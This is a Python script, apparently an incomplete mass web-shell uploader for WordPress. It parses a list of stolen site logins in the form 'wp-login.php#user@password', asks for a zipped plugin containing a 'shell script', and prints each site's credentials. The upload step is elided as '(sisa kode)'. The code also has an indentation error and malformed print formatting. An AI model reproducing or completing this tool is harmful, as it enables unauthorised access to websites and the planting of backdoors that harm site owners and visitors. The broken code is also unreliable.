import sys
import requests
import re
import datetime
import os.path
from colorama import Fore, Style, init

init(autoreset=True)

fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT

if len(sys.argv) != 2:
    path = str(sys.argv[0]).split('/')
    print('[!] Enter <{}> <wordpress.txt>'.format(path[len(path) - 1]))
else:
    if os.path.isfile(sys.argv[1]):
        sites = open(sys.argv[1], 'r')
        file = input('{}{} Put Your Zipped File (UBH) : '.format(fy, sb))
        if os.path.isfile(file):
            if '.zip' in file:
                pluginname = input('{}{} [+] Your Plugin Name ex: (ubh) : '.format(fo, sb))
                shellnamezip = input('{}{} [#] Shell Script : '.format(fy, sb))
            findString = input('{}{} [:=>] Name Of Your Shell (String) : '.format(fc, sb))
            print('')

            for site in sites:
                try:
                    site = site.strip()
					req = requests.session()
                    pLogin = re.compile('http(.*)/wp-login.php#(.*)@(.*)')
                    if re.findall(pLogin, site):
                        dataLogin = re.findall(pLogin, site)
                        domain = 'http' + dataLogin[0][0]
                        user = dataLogin[0][1]
                        password = dataLogin[0][2]
                        print("{}{} [*] Site : ".format(fc, sb) + domain + "/")
                        print(" [*] Username : ".format(fy, sb) + user)
                        print(" [*] Password : ".format(fo, sb) + password)
                        # (sisa kode)
                except:
                    site = site.strip()
                    print(' [-]' + '{} Time Out \n'.format(fr))
                    invalid = open('invalid.txt', 'a')
                    invalid.write(site + "\n")
                    invalid.close()
                    continue
        else:
            print("       File does not exist !")
            sys.exit(0)
    else:
        print("      " + sys.argv[1] + " does not exist !")
        sys.exit(0)
